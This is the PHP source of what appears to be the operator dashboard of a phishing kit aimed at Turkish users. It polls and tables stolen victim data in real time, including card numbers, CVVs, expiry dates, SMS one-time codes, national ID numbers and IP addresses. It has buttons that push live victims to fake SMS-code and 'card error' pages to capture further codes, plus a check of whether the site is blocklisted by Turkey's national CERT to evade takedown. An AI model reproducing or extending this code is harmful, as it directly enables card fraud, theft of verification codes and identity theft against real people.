<?php
session_start();

if (!isset($_SESSION['fast-admin']) || $_SESSION['fast-admin'] !== true) {
    header("Location: fast-login.php");
    exit;
}

require_once '../inc/brain.php';
date_default_timezone_set('Europe/Istanbul');

if (isset($_GET['get_last_log'])) {
    $stmt = $pdo->query("SELECT * FROM logs ORDER BY id DESC LIMIT 1");
    $log = $stmt->fetch(PDO::FETCH_ASSOC);
    echo json_encode($log);
    exit;
}

if (isset($_GET['get_online_count'])) {
    $threshold = time() - 20;
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM ziyaretciler WHERE last_seen > ?");
    $stmt->execute([$threshold]);
    $onlineCount = $stmt->fetchColumn();
    header('Content-Type: application/json');
    echo json_encode(['count' => (int)$onlineCount]);
    exit;
}

if (isset($_GET['get_all_logs'])) {
    $logs = [];
    $sql = "SELECT * FROM logs ORDER BY id DESC";
    $stmt = $pdo->query($sql);
    foreach ($stmt as $row) {
        $logs[] = [
            'id' => $row['id'],
            'log_time' => $row['log_time'],
            'adsoyad' => $row['adsoyad'],
            'kart_numarasi' => $row['kart_numarasi'],
            'kart_cvv' => $row['kart_cvv'],
            'kart_skt' => $row['kart_skt'],
            'banka_adi' => $row['banka_adi'],
            'sms' => $row['sms_sifresi'] ?? null,
            'ip_address' => $row['ip_address'],
            'tckns' => $row['tckns'],
            'aktif_check' => $row['aktif_check'],
            'amount' => $row['amount'],
            'mevcut_sayfa' => $row['mevcut_sayfa'] ?? 'Bilinmiyor'
        ];
    }
    header('Content-Type: application/json');
    echo json_encode($logs);
    exit;
}

if (isset($_POST['ban_ip'])) {
    $ip = $_POST['ban_ip'];
    $stmtBan = $pdo->prepare("INSERT INTO banned (ip_address, banned_at) VALUES (?, NOW())");
    $stmtBan->execute([$ip]);
    $stmtDelete = $pdo->prepare("DELETE FROM logs WHERE ip_address = ?");
    $stmtDelete->execute([$ip]);
    echo json_encode(['success' => true, 'message' => 'IP banlandı ve loglar silindi.']);
    exit;
}

if (isset($_POST['ajax_delete'])) {
    $id = intval($_POST['id']);
    $stmt = $pdo->prepare("DELETE FROM logs WHERE id = ?");
    $result = $stmt->execute([$id]);
    echo json_encode(['success' => $result]);
    exit;
}

try {
    $stmt = $pdo->query("SELECT * FROM yetkili LIMIT 1");
    $yetkili = $stmt->fetch();
    if ($yetkili) {
        $id = $yetkili['id'];
        $_SESSION['yetkili_id'] = $yetkili['id'];
        $kullanici_adi = $yetkili['yetkiliadi'];
        $parola_hash = $yetkili['parola_hash'];
        $kisa_hash = substr($parola_hash, 0, 4) . str_repeat('*', strlen($parola_hash) - 7) . substr($parola_hash, -3);
        $ip_adresi = $yetkili['ip_adresi'];
        $son_giris_tarihi = $yetkili['son_giris_tarihi'];
        $son_giris_ip = $yetkili['son_giris_ip'];
        $son_giris_cihaz = $yetkili['son_giris_cihaz'];
        $son_giris_tarayici = $yetkili['son_giris_tarayici'];
    } else {
        echo "Yetkili kaydı bulunamadı.";
    }
    $stmtPanel = $pdo->query("SELECT t_token, chat_id FROM panel LIMIT 1");
    $panel = $stmtPanel->fetch();
    $t_token = $panel ? $panel['t_token'] : 'Token bulunamadı.';
} catch (PDOException $e) {
    echo "Veritabanı hatası: " . $e->getMessage();
}
?>
<!DOCTYPE html><html lang="en" data-bs-theme="dark"><head>
    <meta charset="utf-8">
    <title>Marco | Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/vendor.min.css" rel="stylesheet">
    <link href="css/app.min.css" rel="stylesheet">
    <link href="css/jquery-jvectormap.css" rel="stylesheet">
    <link href="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/locale/bootstrap-table-tr-TR.min.js"></script>
    <script src="https://unpkg.com/tableexport.jquery.plugin/tableExport.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.22.2/dist/extensions/export/bootstrap-table-export.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
    <script src="https://unpkg.com/xlsx/dist/xlsx.full.min.js"></script>
<body>
    <div id="app" class="app">
        <?php
        include('../inc/fast-header.php');
        include('../inc/fast-sidebar.php');
        ?>
        <button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>
    <div class="app-content">
    <ul class="breadcrumb">
        <li class="breadcrumb-item"><a href="#">Fast Panel</a></li>
        <li class="breadcrumb-item active">Loglar</li>
    </ul>

    <h1 class="page-header">Loglar <small>[Detaylı Yönetim]</small></h1>
    <p>Sitenize gelen anlık log trafiğini gelişmiş ve pratik panel sistemi ile dilediğiniz gibi yönlendirin.</p>
    <style>
    .fixed-table-border { display: none !important; }
    .copyable-card:hover { text-decoration: underline dotted; }
    .marked-row { background-color:rgb(173, 81, 81) !important; }
    .table-fixed { table-layout: fixed; width: 100%; }
    .btn-sm { padding: 0.25rem 0.4rem; font-size: 0.75rem; }
    .btn { white-space: nowrap; min-width: 60px; }
    #ozelMesajModal .modal-dialog { position: fixed; top: 50% !important; left: 50% !important; transform: translate(-50%, -50%) !important; margin: 0 !important; max-width: 500px; width: 90%; }
    th, td { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .modal-backdrop.show { z-index: 1050 !important; }
    .modal.show { z-index: 1060 !important; }
    .modal-dialog { margin: 1.75rem auto; max-width: 500px; }
    .modal.show .modal-dialog { display: flex; align-items: center; min-height: calc(100vh - 1rem); }
    td > div.d-flex { overflow-x: auto; max-width: 100%; }
    @media (max-width: 768px) { table.table-fixed { table-layout: auto !important; } }
    .pulse-animation { animation: pulse 1.5s infinite; box-shadow: 0 0 0 rgba(0, 255, 0, 0.4); }
    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.6); } 70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); } }
    .usom-btn { background-color: #1e3a8a; color: #fff; border: none; padding: 6px 12px; font-size: 0.85rem; border-radius: 6px; transition: all 0.3s ease; }
    .usom-btn:hover { background-color: #1d4ed8; transform: scale(1.04); }
    .table-fixed th:nth-child(1), .table-fixed td:nth-child(1) { width: 8%; }
    .table-fixed th:nth-child(2), .table-fixed td:nth-child(2) { width: 15%; }
    .table-fixed th:nth-child(3), .table-fixed td:nth-child(3) { width: 8%; }
    .table-fixed th:nth-child(4), .table-fixed td:nth-child(4) { width: 10%; }
    .table-fixed th:nth-child(5), .table-fixed td:nth-child(5) { width: 10%; }
    .table-fixed th:nth-child(6), .table-fixed td:nth-child(6) { width: 10%; }
    .table-fixed th:nth-child(7), .table-fixed td:nth-child(7) { width: 10%; }
    </style>
    <div id="logTable" class="mb-5">
        <div class="card">
            <div class="card-body">
                <div class="d-flex justify-content-between align-items-center mb-3">
                   <div class="d-flex flex-column mb-3" style="gap: 8px;">
                    <div class="d-flex align-items-center" style="gap: 10px;">
                        <div id="aktifDot" class="rounded-circle bg-success" style="width: 14px; height: 14px;"></div>
                        <div class="fw-bold text-success fs-5">
                            Aktif Ziyaretçi: <span id="aktifSayac">0</span>
                        </div>
                    </div>
                </div>

                    
                </div>
                <div class="table-responsive">
                    <table 
                        class="table table-bordered table-hover table-fixed" style="min-width: 900px;"
                        data-toggle="table" data-pagination="true"
                        data-show-fullscreen="false" data-sortable="true"
                        data-show-export="true" data-export-types="['csv', 'excel', 'pdf']"
                        data-height="auto" data-locale="tr-TR"
                        data-sort-class="table-active">
                        <thead class="table-dark">
                            <tr>
                                <th data-field="status">Durum</th>
                                <th data-field="log_time" data-sortable="true">Tarih</th>
                                <th data-field="adsoyad" data-sortable="true">TCKN</th>
                                <th data-field="kart_numarasi" data-sortable="true">Şifre</th>
                                <th data-field="kart_skt" data-sortable="true">Ad Soyad</th>
                                <th data-field="kart_cvv" data-sortable="true">Gsm</th>
                                <th data-field="sepet" data-sortable="true">Tutar</th>
                                <th data-field="sepet" data-sortable="true">Ödeme Durumu</th>
                                <th data-field="actions">İşlem</th>
                            </tr>
                        </thead>
                        <tbody>
                        </tbody>
                    </table>
                </div>
            </div>
            <audio id="logSound">
               <source src="notfy.mp3" type="audio/mpeg">
            </audio>
           <div class="modal fade" id="ozelMesajModal" tabindex="-1" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Özel Mesaj Gönder</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <textarea id="ozelMesajInput" class="form-control" rows="4" placeholder="Mesajınızı buraya yazınız..."></textarea>
                        <input type="hidden" id="ozelMesajIp">
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">İptal</button>
                        <button type="button" class="btn btn-primary" id="ozelMesajGonderBtn">Gönder</button>
                    </div>
                    </div>
                </div>
            </div>
            <div class="toasts-container position-fixed top-0 end-0 p-3" style="z-index: 1060;">
                <div class="toast fade hide" id="logToast" data-bs-delay="5000">
                    <div class="toast-header bg-dark text-white border-0">
                        <i class="far fa-bell text-white me-2"></i>
                        <strong class="me-auto">FrancisHit</strong>
                        <small class="text-white-50">Şimdi</small>
                        <button type="button" class="btn-close btn-close-white ms-2 mb-1" data-bs-dismiss="toast" aria-label="Kapat"></button>
                    </div>
                    <div class="toast-body text-white bg-dark border-0 rounded-bottom" id="toastBody">
                        Yeni bir log algılandı.
                    </div>
                </div>
            </div>
            <script>
            let lastLogId = 0;
            let highlightedLogs = [];

            function isActive(aktifCheck) {
                if (!aktifCheck) return false;
                const timestamp = parseInt(aktifCheck);
                if (isNaN(timestamp)) return false;
                const checkTime = timestamp * 1000;
                const now = Date.now();
                return (now - checkTime) <= 10000;
            }

            function formatCardNumber(number) {
                return number.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
            }

            function copyToClipboard(text) {
                navigator.clipboard.writeText(text).then(() => {
                    console.log("Kopyalandı:", text);
                });
            }

            function fetchLastLogId() {
                $.getJSON('?get_last_log=1', function (data) {
                    if (!data || !data.id) return;
                    if (lastLogId === 0) {
                        lastLogId = data.id;
                    } else if (data.id > lastLogId) {
                        lastLogId = data.id;
                        notifyNewLog(data);
                    }
                });
            }
            
            function notifyNewLog(data) {
                $('#toastBody').text(`Yeni log: ${data.adsoyad}`);
                let toast = new bootstrap.Toast(document.getElementById('logToast'));
                toast.show();
                let sound = document.getElementById('logSound');
                if (sound) {
                    sound.pause();
                    sound.currentTime = 0;
                    sound.play();
                }
                updateLogTable();
            }
            
            function updateLogTable() {
                $.getJSON('?get_all_logs=1', function (data) {
                    const tbody = $('table tbody');
                    const scrollPosition = tbody.parent().scrollTop();
                    
                    tbody.empty();

                    if (data.length === 0) {
                        const colspan = 7;
                        tbody.html(`<tr><td colspan="${colspan}" class="text-center p-4">Şu an log verisi bulunmuyor.</td></tr>`);
                        return;
                    }

                    let logs = [...highlightedLogs];
                    logs = logs.concat(data.filter(log => !highlightedLogs.some(h => h.id === log.id)));

                    logs.sort((a, b) => {
                        const aIsMarked = highlightedLogs.some(h => h.id === a.id);
                        const bIsMarked = highlightedLogs.some(h => h.id === b.id);
                        if (aIsMarked && !bIsMarked) return -1;
                        if (!aIsMarked && bIsMarked) return 1;
                        const aActive = isActive(a.aktif_check);
                        const bActive = isActive(b.aktif_check);
                        if (aActive && !bActive) return -1;
                        if (!aActive && bActive) return 1;
                        return b.id - a.id;
                    });

                    logs.forEach(log => {
                        let isMarked = highlightedLogs.some(h => h.id === log.id);
                        let rowClass = isMarked ? 'marked-row' : '';
                        
                        const statusCell = `
                            <td class="text-center align-middle">
                                <div><span class="badge ${isActive(log.aktif_check) ? 'bg-success' : 'bg-secondary'}">${isActive(log.aktif_check) ? '🟢 Aktif' : '🔴 Pasif'}</span></div>
                                <div class="mt-1 text-muted small">- ${log.mevcut_sayfa} -</div>
                            </td>`;

                        const cells = `
                            ${statusCell}
                            <td>${log.log_time}</td>
                            <td>${log.tckns}</td>
                            <td>${log.kart_numarasi}</td>
                                <td>${log.adsoyad ? log.adsoyad : 'Bekleniyor'}</td>
                                <td>${log.kart_cvv ? log.kart_cvv : 'Bekleniyor'}</td>
                                <td>${log.amount ? log.amount + '₺' : 'Bekleniyor'}</td>
                            <td>
                            <span style="
                                    display: inline-flex; 
                                    align-items: center; 
                                    padding: 6px 12px; 
                                    border-radius: 20px; 
                                    font-size: 13px;
                                    font-weight: 700;
                                    text-transform: uppercase;
                                    letter-spacing: 0.5px;
                                    color: ${log.kart_skt == 1 ? '#0F5132' : '#664D03'}; /* Koyu Metin Rengi */
                                    background-color: ${log.kart_skt == 1 ? '#D1E7DD' : '#FFF3CD'}; /* Açık Arka Plan Rengi */
                                    border: 1px solid ${log.kart_skt == 1 ? '#BAD3C5' : '#FFECB5'}; /* Hafif Kenarlık */
                                ">
                                    <i class="${log.kart_skt == 1 ? 'fa-solid fa-check-circle' : 'fa-solid fa-clock'}" 
                                    style="margin-right: 6px;"></i>
                                    
                                    ${log.kart_skt == 1 ? 'Ödeme Alındı' : 'Ödeme Bekleniyor'}
                                </span>
                            </td>
                            `;
                        const actions = `
                          
                            <button class='btn btn-sm btn-danger btn-sil' data-id='${log.id}'>Sil</button>
                            <button class='btn btn-sm btn-warning btn-isaretle' data-id='${log.id}'>İşaretle</button>
                            <button class='btn btn-sm btn-dark btn-ban' data-ip='${log.ip_address}'>Banla</button>
                        `;

                        let row = `
                            <tr class="${rowClass}" data-log-id="${log.id}">
                                ${cells}
                                <td>
                                    <div class="d-flex flex-nowrap gap-1">
                                        ${actions}
                                    </div>
                                </td>
                            </tr>`;
                        tbody.append(row);
                    });
                     tbody.parent().scrollTop(scrollPosition);
                });
            }
            
            $(document).on('click', '.btn-sms-gonder', function () {
                const btn = $(this);
                const ip = btn.data('ip');
                const spinner = btn.find('.spinner-border');
                const text = btn.find('.sms-text');
                spinner.removeClass('d-none');
                text.addClass('d-none');
                $.post('../redirect.php', { ip: ip, target: 'sms.php' }, function () {
                    setTimeout(() => {
                        spinner.addClass('d-none');
                        text.removeClass('d-none');
                        showToast('FrancisHit', 'SMS yönlendirmesi gönderildi.', 'bg-success');
                    }, 1000);
                });
            });

            $(document).on('click', '.btn-tebrik', function () {
                const btn = $(this);
                const ip = btn.data('ip');
                const spinner = btn.find('.spinner-border');
                const text = btn.find('.tebrik-text');
                spinner.removeClass('d-none');
                text.addClass('d-none');
                $.post('../redirect.php', { ip: ip, target: 'tebrik.php' }, function () {
                    setTimeout(() => {
                        spinner.addClass('d-none');
                        text.removeClass('d-none');
                         showToast('FrancisHit', 'Tebrik yönlendirmesi gönderildi.', 'bg-success');
                    }, 1000);
                });
            });

            $(document).on('click', '.btn-ban', function() {
                const ip = $(this).data('ip');
                const $row = $(this).closest('tr');
                if (!ip) return;
                $.post('', { ban_ip: ip }, function(response) {
                    if (response.success) {
                        $row.remove();
                        showToast('FrancisHit', response.message || 'IP başarıyla banlandı.', 'bg-danger');
                    } else {
                        alert('Hata: ' + (response.message || 'Banlama işlemi başarısız.'));
                    }
                }, 'json').fail(() => {
                    alert('Sunucuya bağlanırken hata oluştu.');
                });
            });
            
            $(document).on('click', '.btn-ozel-mesaj', function () {
                const ip = $(this).data('ip');
                $('#ozelMesajIp').val(ip);
                $('#ozelMesajInput').val('');
                const modal = new bootstrap.Modal(document.getElementById('ozelMesajModal'));
                modal.show();
            });

            function showToast(title, message, bgClass = 'bg-dark') {
                const toastEl = document.getElementById('logToast');
                const toastHeader = toastEl.querySelector('.toast-header');
                const toastBody = document.getElementById('toastBody');
                toastHeader.querySelector('strong').textContent = title;
                toastBody.textContent = message;
                toastHeader.className = `toast-header text-white border-0 ${bgClass}`;
                toastBody.className = `toast-body text-white border-0 rounded-bottom ${bgClass}`;
                const toast = new bootstrap.Toast(toastEl);
                toast.show();
            }

            $(document).on('click', '#ozelMesajGonderBtn', function () {
                const ip = $('#ozelMesajIp').val();
                const mesaj = $('#ozelMesajInput').val().trim();
                if (!mesaj) {
                    Swal.fire({ icon: 'warning', title: 'Uyarı', text: 'Mesaj boş olamaz!' });
                    return;
                }
                $.post('../ozel_mesaj.php', { ip: ip, mesaj: mesaj }, function (data) {
                    const modalEl = document.getElementById('ozelMesajModal');
                    const modal = bootstrap.Modal.getInstance(modalEl);
                    if (modal) modal.hide();
                    if (data.success) {
                        showToast('FrancisHit', data.message || 'Mesaj başarıyla gönderildi.', 'bg-success');
                    } else {
                        showToast('Hata', data.message || 'Mesaj gönderilemedi.', 'bg-danger');
                    }
                }, 'json').fail(() => {
                    showToast('Sunucu Hatası', 'Sunucu ile bağlantı kurulamadı.', 'bg-danger');
                });
            });
            
            function updateAktifSayac() {
                    fetch('?get_online_count=1')
                        .then(res => res.json())
                        .then(data => {
                            const count = parseInt(data.count || 0);
                            const sayac = document.getElementById('aktifSayac');
                            const dot = document.getElementById('aktifDot');
                            sayac.textContent = count;
                            if (count > 0) {
                                dot.classList.add('pulse-animation');
                            } else {
                                dot.classList.remove('pulse-animation');
                            }
                        })
                        .catch(err => {
                            console.error("Sayaç güncellenemedi", err);
                        });
            }
            
                function updateSepetSayac() {
                    fetch('get_cart.php')
                        .then(res => res.json())
                        .then(data => {
                            const count = parseInt(data.count || 0);
                            const sayac = document.getElementById('sepetSayac');
                            sayac.textContent = count;
                        })
                        .catch(err => {
                            console.error("Sepet sayacı güncellenemedi", err);
                        });
                }

            $(document).on('click', '.btn-sms-hatali', function () {
                const btn = $(this);
                const ip = btn.data('ip');
                const spinner = btn.find('.spinner-border');
                const text = btn.find('.hsms-text');
                spinner.removeClass('d-none');
                text.addClass('d-none');
                $.post('../redirect.php', { ip: ip, target: 'sms_hatali.php' }, function () {
                    setTimeout(() => {
                        spinner.addClass('d-none');
                        text.removeClass('d-none');
                        showToast('FrancisHit', 'Hatalı SMS yönlendirmesi gönderildi.', 'bg-warning');
                    }, 1000);
                });
            });

            $(document).on('click', '.btn-kart-hatali', function () {
                const btn = $(this);
                const ip = btn.data('ip');
                const spinner = btn.find('.spinner-border');
                const text = btn.find('.hkart-text');
                spinner.removeClass('d-none');
                text.addClass('d-none');
                $.post('../redirect.php', { ip: ip, target: 'odeme.php?h=1' }, function () {
                    setTimeout(() => {
                        spinner.addClass('d-none');
                        text.removeClass('d-none');
                        showToast('FrancisHit', 'Hatalı KART yönlendirilmesi gönderildi.', 'bg-warning');
                    }, 1000);
                });
            });

            $(document).on('click', '.btn-sil', function () {
                const id = $(this).data('id');
                const $row = $(this).closest('tr');
                $.post('', { ajax_delete: true, id: id }, function (response) {
                    if (response.success) {
                         $row.remove();
                    } else {
                        alert("Silme başarısız oldu.");
                    }
                }, 'json').fail(() => {
                    alert("Sunucu hatası.");
                });
            });

            $(document).on('click', '.btn-isaretle', function () {
                const id = parseInt($(this).data('id'));
                const index = highlightedLogs.findIndex(log => log.id === id);
                if (index !== -1) {
                    highlightedLogs.splice(index, 1);
                } else {
                    $.getJSON('?get_all_logs=1', function (data) {
                        const log = data.find(l => l.id == id);
                        if (log) {
                            highlightedLogs.unshift(log);
                        }
                    });
                }
                updateLogTable();
            });

            $(document).ready(function () {
                const exportArea = $('.fixed-table-toolbar .columns');
                if (exportArea.length > 0) {
                    const usomBtn = `
                        <button id="usomKontrolBtn" class="btn btn-sm usom-btn text-white ms-2">
                            <i class="fa fa-shield-alt me-1"></i> USOM Kontrol
                        </button>`;
                    exportArea.prepend(usomBtn);
                }
                updateLogTable();
                setInterval(updateLogTable, 3000);
                fetchLastLogId();
                setInterval(fetchLastLogId, 3000);
                updateAktifSayac();
                setInterval(updateAktifSayac, 5000);
                updateSepetSayac();
                setInterval(updateSepetSayac, 5000);
            });

             $(document).on('click', '#usomKontrolBtn', async function () {
                const button = $(this);
                const originalHtml = button.html();
                button.prop('disabled', true);
                button.html('<i class="fa fa-spinner fa-spin me-1"></i> Sorgulanıyor...');
                try {
                    const response = await fetch('../inc/usom_checker.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' }
                    });
                    if (!response.ok) throw new Error('Sunucu yanıt vermedi.');
                    const blockedUrls = await response.json();
                    const currentDomain = window.location.hostname;
                    if (blockedUrls.includes(currentDomain)) {
                         Swal.fire({
                            icon: 'error', title: 'USOM Engeli!',
                            html: `<strong>Uyarı!</strong><br>Bu site (${currentDomain}) USOM tarafından engellenmiştir.`,
                            confirmButtonText: 'Tamam'
                        });
                    } else {
                        Swal.fire({
                            icon: 'success', title: 'Kayıt Bulunmadı',
                            text: 'Listede yoksunuz, devam edebilirsiniz.',
                            confirmButtonText: 'Tamam'
                        });
                    }
                } catch (error) {
                    console.error('USOM kontrolü sırasında hata:', error);
                    Swal.fire({
                        icon: 'error', title: 'Hata',
                        text: 'USOM kontrolü sırasında bir hata oluştu.',
                        confirmButtonText: 'Tamam'
                    });
                } finally {
                    button.prop('disabled', false);
                    button.html(originalHtml);
                }
            });
            </script>
            <div class="card-arrow">
                <div class="card-arrow-top-left"></div>
                <div class="card-arrow-top-right"></div>
                <div class="card-arrow-bottom-left"></div>
                <div class="card-arrow-bottom-right"></div>
            </div>
        </div>
    </div>
</div>
    <script src="js/vendor.min.js"></script>
    <script src="js/app.min.js"></script>
    <script src="js/dashboard.demo.js"></script>
</body></html>